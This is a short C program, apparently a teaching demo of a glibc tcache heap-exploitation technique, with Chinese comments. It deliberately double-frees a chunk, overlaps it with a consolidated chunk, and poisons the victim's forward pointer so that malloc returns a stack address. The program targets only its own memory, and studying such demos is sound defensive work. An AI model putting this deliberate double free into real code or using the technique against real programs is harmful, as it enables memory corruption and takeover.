#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    // 此為我們的目標
    intptr_t stack_var[4];
    intptr_t x[7];

    // prepare heap layout
    for(int i = 0; i < 7; i++)
        x[i] = malloc(0x100);

    intptr_t *prev = malloc(0x100); // for consolidation
    intptr_t *a = malloc(0x100); // victim
    malloc(0x10); // prevent consolidate with top chunk
    
    // 填滿 tcache
    for(int i = 0; i < 7; i++)
        free(x[i]);
    free(a); // victim will be put into unsorted bin
    free(prev); // consolidate with victim
    
    malloc(0x100); // 從 tcache 取出一塊
    
    // ! vuln
    free(a); // double free victim
    // 此時 a 會被放到 tcache 當中
    
    // 從 unsorted bin 切 0x120 大小的 chunk
    intptr_t *b = malloc(0x120);
    // overwrite victim's fd
    b[0x120/8-2] = (long)stack_var; 
    
    malloc(0x100);
    // get target
    intptr_t *c = malloc(0x100);
    assert(c == stack_var); // sanity check
    
    return 0;
}